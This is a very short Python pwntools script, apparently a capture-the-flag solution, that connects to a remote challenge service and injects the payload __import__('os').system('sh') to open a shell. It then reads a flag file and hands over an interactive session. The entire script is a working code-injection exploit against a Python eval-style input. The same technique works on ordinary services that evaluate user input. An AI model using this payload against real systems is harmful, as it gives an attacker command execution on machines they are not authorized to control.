from pwn import *

p = remote("icewall-ctf.kr", 24006)
p.sendline("__import__('os').system('sh')")
print p.recv()
p.sendline("cat /*/*/flag")
print p.recv()
p.interactive()
